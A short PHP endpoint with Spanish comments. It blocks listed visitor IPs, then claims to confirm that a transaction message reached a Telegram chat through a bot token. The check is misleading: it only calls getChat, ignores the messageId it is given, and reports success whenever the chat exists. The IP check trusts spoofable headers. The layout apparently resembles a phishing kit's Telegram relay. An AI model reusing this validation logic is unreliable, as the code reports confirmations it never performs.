<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');

// Validar que el mensaje fue enviado correctamente a Telegram
$messageId = $_GET['messageId'] ?? $_POST['messageId'] ?? null;
$transactionId = $_GET['transactionId'] ?? $_POST['transactionId'] ?? null;

if (!$messageId || !$transactionId) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Parámetros inválidos',
        'code' => 'INVALID_PARAMS'
    ]);
    exit;
}

// Cargar config
$configLocal = require __DIR__ . '/config.php';
$config = $configLocal;

if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../../../config.php';
    if (file_exists($globalPath)) {
        $config = require $globalPath;
    }
}

// Verificar si el mensaje existe en Telegram
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getChat");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $config['chat_id']]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se pudo validar el mensaje',
        'code' => 'TELEGRAM_ERROR',
        'http_code' => $httpCode
    ]);
    exit;
}

$result = json_decode($response, true);

if ($result['ok']) {
    echo json_encode([
        'status' => 'success',
        'message' => 'Mensaje validado correctamente',
        'messageId' => $messageId,
        'transactionId' => $transactionId
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'Telegram rechazó el mensaje',
        'code' => 'TELEGRAM_REJECTED'
    ]);
}
?>
